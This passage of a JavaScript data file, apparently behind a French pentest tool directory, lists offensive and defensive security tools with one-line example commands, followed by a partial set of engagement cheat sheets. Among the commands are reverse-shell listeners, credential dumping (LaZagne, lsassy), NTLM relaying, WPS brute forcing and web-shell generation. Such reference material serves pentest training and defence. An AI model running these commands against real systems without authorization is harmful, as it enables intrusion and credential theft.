  { name: "linux-smart-enumeration", url: "https://github.com/diego-treitos/linux-smart-enumeration", cat: "post", platforms: ["linux"], phases: ["post"],
    desc: "Énumération privesc Linux avec niveaux de verbosité progressifs.", cmd: "./lse.sh -l1", tags: "privesc linux enumeration lse" },
  { name: "windows-exploit-suggester-ng", url: "https://github.com/bitsadmin/wesng", cat: "post", platforms: ["windows"], phases: ["post","vuln"],
    desc: "Propose des exploits Windows à partir de la sortie de systeminfo.", cmd: "wes.py systeminfo.txt", tags: "privesc windows patch exploit suggester" },

  /* ===== Shells, tunneling & pivot ===== */
  { name: "Netcat (nc)", url: "https://nmap.org/ncat/", cat: "pivot", platforms: ["multi"], phases: ["exploit","post"], star: true,
    desc: "Le couteau suisse TCP/UDP : listener, bind/reverse shell, transfert de fichiers.", cmd: "nc -lvnp 4444", tags: "reverse bind shell listener tcp couteau ncat" },
  { name: "socat", url: "http://www.dest-unreach.org/socat/", cat: "pivot", platforms: ["multi"], phases: ["exploit","post"],
    desc: "Relais de flux avancé : shells chiffrés, TTY stable, redirections.", cmd: "socat TCP-L:4444 FILE:`tty`,raw,echo=0", tags: "relais shell tty chiffre redirection" },
  { name: "Chisel", url: "https://github.com/jpillora/chisel", cat: "pivot", platforms: ["multi"], phases: ["post"], star: true,
    desc: "Tunnel TCP/UDP sur HTTP, idéal pour le pivot à travers un pare-feu.", cmd: "chisel server -p 8080 --reverse", tags: "tunnel pivot socks reverse http firewall" },
  { name: "Ligolo-ng", url: "https://github.com/nicocha30/ligolo-ng", cat: "pivot", platforms: ["multi"], phases: ["post"], star: true,
    desc: "Pivot moderne via interface TUN : accès au réseau interne sans proxychains.", tags: "pivot tunnel tun interne reseau moderne" },
  { name: "proxychains", url: "https://github.com/haad/proxychains", cat: "pivot", platforms: ["linux"], phases: ["post"],
    desc: "Force n'importe quel outil à passer par un proxy SOCKS (pivot).", cmd: "proxychains nmap -sT <ip_interne>", tags: "socks proxy pivot tunnel" },
  { name: "sshuttle", url: "https://github.com/sshuttle/sshuttle", cat: "pivot", platforms: ["linux"], phases: ["post"],
    desc: "VPN « pauvre » sur une simple connexion SSH pour router un sous-réseau.", cmd: "sshuttle -r user@pivot 10.10.10.0/24", tags: "vpn ssh pivot route reseau" },
  { name: "SSH port forwarding", url: "https://www.ssh.com/academy/ssh/tunneling", cat: "pivot", platforms: ["multi"], phases: ["post"],
    desc: "Tunnels natifs SSH (-L local, -R distant, -D dynamique/SOCKS).", cmd: "ssh -L 8080:cible_interne:80 user@pivot", tags: "ssh tunnel forward pivot socks" },
  { name: "revshells.com", url: "https://www.revshells.com/", cat: "pivot", platforms: ["web"], phases: ["exploit"], star: true,
    desc: "Générateur en ligne de reverse shells (bash, python, nc, PowerShell…).", tags: "reverse shell generateur payload" },
  { name: "rlwrap", url: "https://github.com/hanslub42/rlwrap", cat: "pivot", platforms: ["linux"], phases: ["post"],
    desc: "Ajoute l'historique et l'édition de ligne à un shell capturé.", cmd: "rlwrap nc -lvnp 4444", tags: "shell confort historique tty" },

  /* ===== Sniffing & MITM ===== */
  { name: "Wireshark", url: "https://www.wireshark.org/", cat: "sniff", platforms: ["multi"], phases: ["enum","support"], star: true,
    desc: "Analyseur de protocoles réseau de référence (capture et dissection).", tags: "capture pcap protocole analyse trafic" },
  { name: "tcpdump", url: "https://www.tcpdump.org/", cat: "sniff", platforms: ["multi"], phases: ["enum","support"],
    desc: "Capture réseau en ligne de commande, légère et scriptable.", cmd: "tcpdump -i eth0 -w capture.pcap", tags: "capture pcap cli trafic" },
  { name: "Bettercap", url: "https://www.bettercap.org/", cat: "sniff", platforms: ["multi"], phases: ["exploit"],
    desc: "Framework MITM moderne : ARP spoofing, sniffing, injection, Wi-Fi/BLE.", tags: "mitm arp spoofing sniff wifi ble" },
  { name: "Ettercap", url: "https://www.ettercap-project.org/", cat: "sniff", platforms: ["linux"], phases: ["exploit"],
    desc: "Suite classique d'attaques MITM sur réseau local.", tags: "mitm arp spoofing lan" },
  { name: "mitmproxy", url: "https://mitmproxy.org/", cat: "sniff", platforms: ["multi"], phases: ["exploit"],
    desc: "Proxy HTTP(S) interactif pour inspecter et modifier le trafic.", cmd: "mitmproxy -p 8080", tags: "proxy https interception trafic api" },

  /* ===== Wi-Fi & sans-fil ===== */
  { name: "Aircrack-ng", url: "https://www.aircrack-ng.org/", cat: "wireless", platforms: ["linux"], phases: ["exploit"], star: true,
    desc: "Suite d'audit Wi-Fi : capture de handshakes et cassage WEP/WPA.", cmd: "aircrack-ng -w rockyou.txt capture.cap", tags: "wifi wpa handshake wep cassage" },
  { name: "Wifite2", url: "https://github.com/derv82/wifite2", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
    desc: "Automatise les attaques Wi-Fi (WEP/WPA/WPS) autour d'Aircrack.", cmd: "wifite", tags: "wifi automatisation wpa wps" },
  { name: "Kismet", url: "https://www.kismetwireless.net/", cat: "wireless", platforms: ["linux"], phases: ["recon","enum"],
    desc: "Détecteur/sniffer sans fil (Wi-Fi, Bluetooth, SDR).", tags: "wifi detection sniff bluetooth sdr" },
  { name: "hcxtools / hcxdumptool", url: "https://github.com/ZerBea/hcxtools", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
    desc: "Capture de PMKID et conversion de handshakes pour Hashcat.", tags: "wifi pmkid handshake hashcat conversion" },
  { name: "Reaver", url: "https://github.com/t6x/reaver-wps-fork-t6x", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
    desc: "Bruteforce en ligne du PIN WPS pour récupérer la clé WPA/WPA2 (aussi attaque Pixie Dust).", cmd: "reaver -i wlan0mon -b <BSSID> -vv", tags: "wifi wps pin bruteforce pixie dust clé wpa" },
  { name: "Bully", url: "https://github.com/aanarchyy/bully", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
    desc: "Alternative à Reaver pour le bruteforce du PIN WPS, plus robuste sur certaines puces.", cmd: "bully wlan0mon -b <BSSID> -c <canal>", tags: "wifi wps pin bruteforce clé wpa" },

  /* ===== Wordlists & payloads ===== */
  { name: "SecLists", url: "https://github.com/danielmiessler/SecLists", cat: "wordlists", platforms: ["multi"], phases: ["support"], star: true,
    desc: "La collection incontournable : mots de passe, répertoires, usernames, payloads.", tags: "wordlist dictionnaire fuzzing payload collection" },
  { name: "rockyou.txt", url: "https://github.com/brannondorsey/naive-hashcat/releases/tag/data", cat: "wordlists", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Wordlist de mots de passe la plus utilisée (fuite RockYou).", cmd: "/usr/share/wordlists/rockyou.txt", tags: "wordlist mot-de-passe bruteforce cassage" },
  { name: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", cat: "wordlists", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Compendium de payloads et techniques de contournement par type de faille.", tags: "payload injection bypass technique reference" },
  { name: "FuzzDB", url: "https://github.com/fuzzdb-project/fuzzdb", cat: "wordlists", platforms: ["multi"], phases: ["exploit"],
    desc: "Patterns d'attaque et de découverte pour le fuzzing applicatif.", tags: "fuzzing payload pattern web" },
  { name: "Weakpass", url: "https://weakpass.com/", cat: "wordlists", platforms: ["web"], phases: ["support"],
    desc: "Catalogue de wordlists téléchargeables, triées par taille et usage.", tags: "wordlist catalogue telechargement" },

  /* ===== Références & LOLBINs ===== */
  { name: "GTFOBins", url: "https://gtfobins.github.io/", cat: "refs", platforms: ["linux"], phases: ["post"], star: true,
    desc: "Binaires Unix détournables pour contourner des restrictions et élever ses privilèges (SUID, sudo…).", tags: "linux privesc suid sudo binaire bypass lolbin reference" },
  { name: "LOLBAS", url: "https://lolbas-project.github.io/", cat: "refs", platforms: ["windows"], phases: ["post"], star: true,
    desc: "Binaires/scripts Windows légitimes détournables (Living Off The Land).", tags: "windows lolbin living-off-the-land binaire bypass reference" },
  { name: "LOLDrivers", url: "https://www.loldrivers.io/", cat: "refs", platforms: ["windows"], phases: ["post"],
    desc: "Base des pilotes Windows vulnérables/malveillants (BYOVD).", tags: "windows driver byovd vulnerable reference" },
  { name: "WADComs", url: "https://wadcoms.github.io/", cat: "refs", platforms: ["windows"], phases: ["exploit","post"],
    desc: "Cheat-sheet interactive des commandes offensives Windows/Active Directory.", tags: "windows ad commande cheatsheet reference" },
  { name: "HackTricks", url: "https://book.hacktricks.xyz/", cat: "refs", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Encyclopédie des techniques offensives par service et par OS — la bible du pentest.", tags: "cheatsheet technique service privesc reference bible" },
  { name: "revshells.com (cheat)", url: "https://www.revshells.com/", cat: "refs", platforms: ["web"], phases: ["exploit"],
    desc: "Référence rapide pour générer et mémoriser toutes les formes de reverse shell.", tags: "reverse shell cheatsheet generateur" },
  { name: "CyberChef", url: "https://gchq.github.io/CyberChef/", cat: "refs", platforms: ["web"], phases: ["support"],
    desc: "« Couteau suisse » d'encodage/décodage/chiffrement dans le navigateur.", tags: "encodage decodage base64 chiffrement conversion" },
  { name: "Exploit-DB / GHDB", url: "https://www.exploit-db.com/google-hacking-database", cat: "refs", platforms: ["web"], phases: ["recon"],
    desc: "Google Hacking Database : catalogue de dorks prêts à l'emploi.", tags: "google dork ghdb recherche reference" },
  { name: "MITRE ATT&CK", url: "https://attack.mitre.org/", cat: "refs", platforms: ["web"], phases: ["support"], star: true,
    desc: "Base mondiale des tactiques et techniques d'attaque (TTP), socle du threat modeling.", tags: "ttp tactique technique threat modeling reference" },
  { name: "HackTricks Cloud", url: "https://cloud.hacktricks.xyz/", cat: "refs", platforms: ["web"], phases: ["support"],
    desc: "Pendant de HackTricks dédié aux attaques cloud (AWS, Azure, GCP, K8s).", tags: "cloud aws azure gcp kubernetes reference" },

  /* ===== Méthodologies & frameworks ===== */
  { name: "PTES", url: "http://www.pentest-standard.org/", cat: "method", platforms: ["web"], phases: ["support"],
    desc: "Penetration Testing Execution Standard : les 7 phases d'un test d'intrusion.", tags: "methodologie phase standard pentest" },
  { name: "OWASP Testing Guide / WSTG", url: "https://owasp.org/www-project-web-security-testing-guide/", cat: "method", platforms: ["web"], phases: ["support"], star: true,
    desc: "Méthodologie de référence pour le test de sécurité des applications web.", tags: "web owasp methodologie test application" },
  { name: "NIST SP 800-115", url: "https://csrc.nist.gov/pubs/sp/800/115/final", cat: "method", platforms: ["web"], phases: ["support"],
    desc: "Guide technique officiel du NIST pour l'évaluation de sécurité.", tags: "nist methodologie evaluation standard" },
  { name: "OSSTMM", url: "https://www.isecom.org/OSSTMM.3.pdf", cat: "method", platforms: ["web"], phases: ["support"],
    desc: "Open Source Security Testing Methodology Manual : cadre d'audit mesurable.", tags: "methodologie audit mesure standard" },
  { name: "Cyber Kill Chain", url: "https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html", cat: "method", platforms: ["web"], phases: ["support"],
    desc: "Modèle en 7 étapes décrivant le déroulé d'une intrusion (Lockheed Martin).", tags: "killchain modele intrusion etape" },
  { name: "AttackerKB", url: "https://attackerkb.com/", cat: "method", platforms: ["web"], phases: ["vuln"],
    desc: "Retours d'expérience communautaires sur l'exploitabilité réelle des vulnérabilités.", tags: "vulnerabilite exploitabilite avis cve" },

  /* ===== OSINT (compléments) ===== */
  { name: "ZoomEye", url: "https://www.zoomeye.org/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Moteur de recherche d'actifs exposés sur Internet (alternative à Shodan/Censys).", tags: "moteur exposition bannière iot" },
  { name: "Netcraft", url: "https://www.netcraft.com/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Historique d'hébergement, technologies et infrastructure d'un site web.", tags: "hebergement techno historique site" },

  /* ===== Active Directory (compléments) ===== */
  { name: "ntlmrelayx (Impacket)", url: "https://github.com/fortra/impacket", cat: "ad", platforms: ["linux"], phases: ["exploit"], star: true,
    desc: "Relaie une authentification NTLM capturée vers SMB/LDAP/MSSQL/HTTP pour exécuter des actions.", cmd: "impacket-ntlmrelayx -tf cibles.txt -smb2support",
    tags: "ntlm relay responder smb ldap coercion secretsdump" },
  { name: "mitm6", url: "https://github.com/dirkjanm/mitm6", cat: "ad", platforms: ["linux"], phases: ["exploit"],
    desc: "Abuse de l'IPv6 par défaut (WPAD/DNS) pour un MITM ; se combine avec ntlmrelayx.", cmd: "mitm6 -d esdown.local", tags: "ipv6 wpad dns relay ntlm mitm" },
  { name: "SharpHound", url: "https://github.com/SpecterOps/SharpHound", cat: "ad", platforms: ["windows"], phases: ["enum"],
    desc: "Collecteur de données AD (sessions, ACL, groupes) qui alimente BloodHound.", cmd: "SharpHound.exe -c All", tags: "bloodhound collecteur ldap collector" },
  { name: "lsassy", url: "https://github.com/Hackndo/lsassy", cat: "ad", platforms: ["linux"], phases: ["post"],
    desc: "Dump à distance de LSASS et extraction des identifiants (s'intègre à NetExec).", cmd: "lsassy -d dom -u user -H <hash> <ip>", tags: "lsass dump credential distant comsvcs" },
  { name: "PsExec (Sysinternals)", url: "https://learn.microsoft.com/sysinternals/downloads/psexec", cat: "ad", platforms: ["windows"], phases: ["post"],
    desc: "Exécution de commandes à distance via SMB (upload d'un service) — natif, légitime.", cmd: "psexec.exe \\\\cible -s cmd", tags: "smb service distant laterale sysinternals system" },

  /* ===== Post-exploitation (compléments) ===== */
  { name: "LaZagne", url: "https://github.com/AlessandroZ/LaZagne", cat: "post", platforms: ["multi"], phases: ["post"], star: true,
    desc: "Récupère les mots de passe stockés : navigateurs, mails, Wi-Fi, bases, Git, messageries.", cmd: "lazagne.exe all", tags: "credential mot-de-passe navigateur dump loot" },
  { name: "mimipenguin", url: "https://github.com/huntergregal/mimipenguin", cat: "post", platforms: ["linux"], phases: ["post"],
    desc: "Extrait les identifiants en clair de la mémoire d'un système Linux.", cmd: "./mimipenguin.sh", tags: "credential memoire linux mot-de-passe" },
  { name: "PrintSpoofer", url: "https://github.com/itm4n/PrintSpoofer", cat: "post", platforms: ["windows"], phases: ["post"],
    desc: "Élévation vers SYSTEM via SeImpersonatePrivilege (comptes de service).", cmd: "PrintSpoofer.exe -i -c cmd", tags: "privesc system seimpersonate potato service" },
  { name: "Potato suite (JuicyPotato/GodPotato)", url: "https://github.com/BeichenDream/GodPotato", cat: "post", platforms: ["windows"], phases: ["post"],
    desc: "Famille d'exploits abusant l'impersonation pour obtenir un jeton SYSTEM.", cmd: "GodPotato -cmd \"cmd /c whoami\"", tags: "privesc system potato juicy impersonation token" },
  { name: "SharpUp", url: "https://github.com/GhostPack/SharpUp", cat: "post", platforms: ["windows"], phases: ["post"],
    desc: "Portage C# de PowerUp : détection rapide de voies d'élévation Windows.", cmd: "SharpUp.exe audit", tags: "privesc windows powerup ghostpack service" },

  /* ===== Web (compléments) ===== */
  { name: "Wappalyzer", url: "https://www.wappalyzer.com/", cat: "web", platforms: ["web"], phases: ["enum"],
    desc: "Identifie les technologies, frameworks et CMS d'un site (extension navigateur).", tags: "techno cms framework fingerprint" },
  { name: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool", cat: "web", platforms: ["linux"], phases: ["exploit"],
    desc: "Analyse et attaque les JSON Web Tokens (alg=none, bruteforce de secret, forge).", cmd: "python3 jwt_tool.py <token>", tags: "jwt token authentification forge none" },
  { name: "Dalfox", url: "https://github.com/hahwul/dalfox", cat: "web", platforms: ["multi"], phases: ["exploit"],
    desc: "Scanner XSS rapide avec vérification des payloads réellement exécutés.", cmd: "dalfox url 'http://<ip>/?q=1'", tags: "xss scanner payload injection" },
  { name: "Commix", url: "https://github.com/commixproject/commix", cat: "web", platforms: ["linux"], phases: ["exploit"],
    desc: "Détection et exploitation automatisée des injections de commandes (OS command injection).", cmd: "commix -u 'http://<ip>/?p=1'", tags: "command injection rce web" },
  { name: "BeEF", url: "https://github.com/beefproject/beef", cat: "web", platforms: ["linux"], phases: ["exploit"],
    desc: "Framework d'exploitation du navigateur (hook XSS → contrôle du client).", tags: "xss navigateur hook client framework" },
  { name: "Weevely", url: "https://github.com/epinna/weevely3", cat: "web", platforms: ["linux"], phases: ["post"],
    desc: "Web shell PHP furtif et chiffré, avec de nombreux modules de post-exploitation.", cmd: "weevely generate <pass> shell.php", tags: "webshell php backdoor post" },
  { name: "JoomScan", url: "https://github.com/OWASP/joomscan", cat: "web", platforms: ["linux"], phases: ["vuln"],
    desc: "Scanner de vulnérabilités spécialisé Joomla (équivalent de WPScan).", cmd: "joomscan -u http://<ip>", tags: "joomla cms scanner" },
  { name: "sslscan / testssl.sh", url: "https://github.com/drwetter/testssl.sh", cat: "web", platforms: ["linux"], phases: ["vuln"],
    desc: "Audit de la configuration TLS/SSL (protocoles, ciphers, Heartbleed…).", cmd: "testssl.sh https://<ip>", tags: "tls ssl chiffrement cipher heartbleed" },

  /* ===== Cracking (compléments) ===== */
  { name: "CUPP", url: "https://github.com/Mebus/cupp", cat: "crack", platforms: ["linux"], phases: ["exploit"],
    desc: "Génère un dictionnaire personnalisé à partir d'infos OSINT sur la cible (dates, noms, leet).", cmd: "cupp -i", tags: "wordlist profil osint personnalise" },

  /* ===== Sniffing & MITM (compléments) ===== */
  { name: "PCredz", url: "https://github.com/lgandx/PCredz", cat: "sniff", platforms: ["linux"], phases: ["enum"],
    desc: "Extrait identifiants et hashes (NTLM, cartes, etc.) depuis un pcap ou le trafic live.", cmd: "PCredz -f capture.pcap", tags: "pcap credential ntlm extraction sniff" },
  { name: "dsniff", url: "https://www.monkey.org/~dugsong/dsniff/", cat: "sniff", platforms: ["linux"], phases: ["exploit"],
    desc: "Suite MITM historique (arpspoof, dnsspoof, sshmitm…) pour capturer le trafic.", tags: "mitm arpspoof dnsspoof capture reseau" },

  /* ===== Exploitation (ICS/SCADA) ===== */
  { name: "MBTGET", url: "https://github.com/sourceperl/mbtget", cat: "exploit", platforms: ["linux"], phases: ["exploit"],
    desc: "Client Modbus TCP (port 502) pour lire/écrire coils et registres d'automates (ICS/SCADA).", cmd: "mbtget -r3 -a 0 -n 10 <ip>", tags: "ics scada modbus plc automate industriel" },

  /* ===== Reverse & forensic ===== */
  { name: "Ghidra", url: "https://ghidra-sre.org/", cat: "forensic", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Suite de rétro-ingénierie de la NSA : désassembleur et décompilateur multi-architectures.", tags: "reverse desassembleur decompilateur nsa binaire" },
  { name: "radare2 / Rizin", url: "https://rizin.re/", cat: "forensic", platforms: ["multi"], phases: ["support"],
    desc: "Framework d'analyse binaire en ligne de commande (désassemblage, debug, patch).", cmd: "r2 -A binaire", tags: "reverse binaire desassemblage debug cli" },
  { name: "Cutter", url: "https://cutter.re/", cat: "forensic", platforms: ["multi"], phases: ["support"],
    desc: "Interface graphique de reverse engineering bâtie sur Rizin.", tags: "reverse gui rizin binaire" },
  { name: "Volatility 3", url: "https://github.com/volatilityfoundation/volatility3", cat: "forensic", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Analyse forensique de la mémoire vive (processus, connexions, injections, hashes).", cmd: "vol -f memoire.raw windows.pslist", tags: "memoire ram forensic dfir dump" },
  { name: "Autopsy / Sleuth Kit", url: "https://www.autopsy.com/", cat: "forensic", platforms: ["multi"], phases: ["support"],
    desc: "Plateforme d'investigation sur disques et systèmes de fichiers (DFIR).", tags: "disque forensic dfir fichier investigation" },
  { name: "binwalk", url: "https://github.com/ReFirmLabs/binwalk", cat: "forensic", platforms: ["linux"], phases: ["support"],
    desc: "Analyse et extraction de contenus embarqués dans un firmware ou un fichier binaire.", cmd: "binwalk -e firmware.bin", tags: "firmware extraction binaire embarque" },
  { name: "Cuckoo Sandbox", url: "https://cuckoosandbox.org/", cat: "forensic", platforms: ["linux"], phases: ["support"],
    desc: "Bac à sable automatisé d'analyse dynamique de malware.", tags: "malware sandbox analyse dynamique" },

  /* ===== Blue Team / SOC & détection ===== */
  { name: "Sysmon", url: "https://learn.microsoft.com/sysinternals/downloads/sysmon", cat: "blue", platforms: ["windows"], phases: ["support"], star: true,
    desc: "Journalisation avancée Windows (création de process, réseau, DNS, injections) pour la détection.", cmd: "sysmon64 -accepteula -i config.xml", tags: "sysinternals log detection sysmon event telemetrie" },
  { name: "Sysinternals Suite", url: "https://learn.microsoft.com/sysinternals/", cat: "blue", platforms: ["windows"], phases: ["support"],
    desc: "Procmon, Process Explorer, Autoruns, ProcDump, TCPView… pour l'analyse système et l'IR.", tags: "sysinternals process autoruns procdump tcpview analyse" },
  { name: "SIGMA (SigmaHQ)", url: "https://github.com/SigmaHQ/sigma", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Format universel de règles de détection (YAML), convertible vers chaque SIEM. « Snort pour les logs ».", tags: "detection regle siem yaml mitre log" },
  { name: "YARA", url: "https://github.com/VirusTotal/yara", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Moteur de détection de malware par motifs (règles sur fichiers et mémoire).", cmd: "yara regle.yar fichier", tags: "malware detection pattern regle signature" },
  { name: "Wazuh", url: "https://wazuh.com/", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Plateforme XDR/SIEM open source : détection, intégrité, réponse auto (isolement).", tags: "xdr siem edr open source detection reponse" },
  { name: "Elastic Stack (ELK)", url: "https://www.elastic.co/elastic-stack", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
    desc: "Beats + Logstash + Elasticsearch + Kibana : collecte, indexation et visualisation des logs.", tags: "siem elk elastic kibana logstash beats log" },
  { name: "Splunk", url: "https://www.splunk.com/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Plateforme d'analyse de données/SIEM de référence (SPL, MLTK, Phantom/SOAR).", cmd: "... | stats count by src_ip | where count > 10", tags: "siem splunk spl log correlation" },
  { name: "Graylog", url: "https://graylog.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "SIEM open source de centralisation et de corrélation de logs.", tags: "siem log open source correlation" },
  { name: "Suricata", url: "https://suricata.io/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "IDS/IPS réseau haute performance (inspection, règles, extraction de fichiers).", tags: "ids ips reseau nids detection regle" },
  { name: "Zeek", url: "https://zeek.org/", cat: "blue", platforms: ["linux"], phases: ["support"],
    desc: "Moniteur de sécurité réseau générant une télémétrie riche (ex-Bro).", tags: "nsm reseau monitoring telemetrie bro" },
  { name: "Snort", url: "https://www.snort.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "IDS/IPS réseau historique à base de signatures.", tags: "ids ips signature reseau detection" },
  { name: "OpenCTI", url: "https://www.opencti.io/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Plateforme de Cyber Threat Intelligence (modèle STIX2, corrélation d'IoC/TTP).", tags: "cti threat intelligence stix ioc ttp" },
  { name: "MISP", url: "https://www.misp-project.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Plateforme de partage et de corrélation d'indicateurs de compromission (IoC).", tags: "cti ioc partage threat intelligence" },
  { name: "TheHive / Cortex", url: "https://strangebee.com/thehive/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Plateforme de réponse à incident (case management) et d'analyse d'observables.", tags: "ir incident soar case management observable" },
  { name: "Velociraptor", url: "https://docs.velociraptor.app/", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Chasse et collecte DFIR à grande échelle sur le parc (endpoint visibility).", tags: "dfir endpoint hunting collecte forensic" },
  { name: "Atomic Red Team", url: "https://github.com/redcanaryco/atomic-red-team", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Tests d'attaque atomiques mappés MITRE ATT&CK pour valider la détection (Purple Team).", tags: "purple mitre test detection simulation bas" },
  { name: "CALDERA", url: "https://github.com/mitre/caldera", cat: "blue", platforms: ["multi"], phases: ["support"],
    desc: "Simulation d'adversaire automatisée par agents (MITRE) — émulation de TTP.", tags: "mitre adversaire emulation bas purple agent" },
  { name: "auditd", url: "https://github.com/linux-audit/audit-userspace", cat: "blue", platforms: ["linux"], phases: ["support"],
    desc: "Démon d'audit Linux (appels système, accès fichiers) ; source de logs pour le SIEM.", cmd: "auditctl -l", tags: "linux audit log detection siem" },

  /* ===== Entraînement & labs ===== */
  { name: "Hack The Box", url: "https://www.hackthebox.com/", cat: "train", platforms: ["web"], phases: ["support"], star: true,
    desc: "Machines et labs d'entraînement offensif (du débutant au réaliste), + Academy.", tags: "ctf lab machine entrainement htb academy" },
  { name: "TryHackMe", url: "https://tryhackme.com/", cat: "train", platforms: ["web"], phases: ["support"], star: true,
    desc: "Parcours guidés et salles thématiques, idéal pour apprendre pas à pas.", tags: "ctf lab apprentissage parcours room debutant" },
  { name: "VulnHub", url: "https://www.vulnhub.com/", cat: "train", platforms: ["web"], phases: ["support"],
    desc: "Catalogue de VM vulnérables à télécharger et exploiter en local.", tags: "vm vulnerable lab local boot2root" },
  { name: "Root-Me", url: "https://www.root-me.org/", cat: "train", platforms: ["web"], phases: ["support"],
    desc: "Plateforme française de challenges par catégories (web, crack, réseau, stégano…).", tags: "challenge francais web crack ctf" },
  { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", cat: "train", platforms: ["web"], phases: ["support"], star: true,
    desc: "Labs gratuits de référence sur les vulnérabilités web (par les créateurs de Burp).", tags: "web labs owasp apprentissage burp gratuit" },
  { name: "OWASP Juice Shop", url: "https://owasp.org/www-project-juice-shop/", cat: "train", platforms: ["multi"], phases: ["support"],
    desc: "Application web volontairement vulnérable (OWASP Top 10) à auto-héberger.", tags: "owasp vulnerable web lab entrainement" },
  { name: "DVWA", url: "https://github.com/digininja/DVWA", cat: "train", platforms: ["multi"], phases: ["support"],
    desc: "Damn Vulnerable Web Application : terrain d'entraînement web classique (niveaux de difficulté).", tags: "vulnerable web php lab entrainement" },
  { name: "WebGoat", url: "https://owasp.org/www-project-webgoat/", cat: "train", platforms: ["multi"], phases: ["support"],
    desc: "Application d'apprentissage OWASP avec leçons guidées.", tags: "owasp vulnerable web lecon apprentissage" },
  { name: "PentesterLab", url: "https://pentesterlab.com/", cat: "train", platforms: ["web"], phases: ["support"],
    desc: "Exercices ciblés sur des vulnérabilités précises, avec explications.", tags: "web exercice vulnerabilite apprentissage" }
];

/* ------------------------------------------------- CHEATS (cas d'usage) ---
 * « Dans telle situation, quels outils lancer ? » — mémo décisionnel.
 * steps = liste de { tool, cmd } ; names doivent idéalement exister dans TOOLS.
 */
const CHEATS = [
  { icon: "🚪", title: "Je démarre un test interne, je ne connais que le sous-réseau",
    phase: "enum",
    steps: [
      { tool: "netdiscover", cmd: "netdiscover -r 10.10.10.0/24   # hôtes vivants (ARP)" },
      { tool: "Nmap", cmd: "nmap -sn 10.10.10.0/16   # ping sweep large pour ne rien manquer" },
      { tool: "Nmap", cmd: "nmap -sS -sV -O -sC -oA scan -iL ips.txt   # ports/services/OS" }
    ],
    note: "Scanner large d'abord (/16), puis affiner. Exporter (-oA) pour alimenter les étapes suivantes." },

  { icon: "📁", title: "Port 445 / SMB ouvert",
    phase: "enum",
    steps: [
      { tool: "Nmap", cmd: "nmap -p445 --script smb-* <ip>" },
      { tool: "enum4linux-ng", cmd: "enum4linux-ng -A <ip>   # users, shares, policy" },
      { tool: "smbmap", cmd: "smbmap -H <ip> -R   # droits + contenu récursif" },
      { tool: "smbclient", cmd: "smbclient -L //<ip>/ -N   # partages en anonyme (NULL session)" }
    ],
    note: "Chercher systématiquement l'accès anonyme/guest : une NULL session en lecture suffit souvent à exfiltrer des données." },

  { icon: "🏰", title: "C'est un contrôleur de domaine (LDAP 389 / SMB 445 Windows)",
    phase: "enum",
    steps: [
      { tool: "Nmap", cmd: "nmap -p389 --script ldap-rootdse <ip>   # confirmer domaine/DC" },
      { tool: "NetExec (ex-CrackMapExec)", cmd: "nxc smb <ip> -u '' -p ''   # null session, infos domaine" },
      { tool: "BloodHound", cmd: "bloodhound-python -d dom.local -u u -p p -c all" },
      { tool: "Impacket", cmd: "impacket-GetNPUsers / secretsdump pour roasting & hashes" }
    ],
    note: "Une fois des identifiants obtenus : BloodHound pour trouver le chemin vers Domain Admin, impacket/NetExec pour le rejeu." },

  { icon: "📞", title: "Port 161 / SNMP ouvert",
    phase: "enum",
    steps: [
      { tool: "snmpwalk", cmd: "snmpwalk -v2c -c public <ip>   # tout l'arbre si 'public' actif" },
      { tool: "snmp-check", cmd: "snmp-check -c public <ip>   # synthèse lisible" }
    ],
    note: "La communauté par défaut 'public' (CVE-1999-0517) fuit OS, processus, logiciels, ports et points de montage." },

  { icon: "🌐", title: "Port 53 / DNS ouvert",
    phase: "enum",
    steps: [
      { tool: "whois / dig / host", cmd: "host -t ns <domaine>   # identifier les serveurs de noms" },
      { tool: "whois / dig / host", cmd: "dig axfr <domaine> @<ns_ip>   # tentative de transfert de zone" },
      { tool: "dnsenum", cmd: "dnsenum <domaine>" }
    ],
    note: "Un transfert de zone (AXFR) autorisé livre l'inventaire complet du domaine, y compris des hôtes hors du sous-réseau scanné." },

  { icon: "💾", title: "Port 2049 / NFS ouvert",
    phase: "enum",
    steps: [
      { tool: "showmount / NFS", cmd: "showmount -e <ip>   # lister les exports" },
      { tool: "showmount / NFS", cmd: "mount -t nfs <ip>:/export /mnt   # monter et vérifier les droits réels" }
    ],
    note: "Un export ouvert en lecture/écriture pour tout le monde est un accès direct aux fichiers (voire du no_root_squash)." },

  { icon: "🕸️", title: "Il y a une application web",
    phase: "enum",
    steps: [
      { tool: "WhatWeb", cmd: "whatweb http://<ip>   # techno/CMS/versions" },
      { tool: "EyeWitness", cmd: "eyewitness -x scan.xml -d ./shots   # tri visuel" },
      { tool: "ffuf", cmd: "ffuf -u http://<ip>/FUZZ -w wordlist.txt   # contenu caché" },
      { tool: "Nikto", cmd: "nikto -h http://<ip>" },
      { tool: "Burp Suite", cmd: "Interception manuelle (Repeater/Intruder)" }
    ],
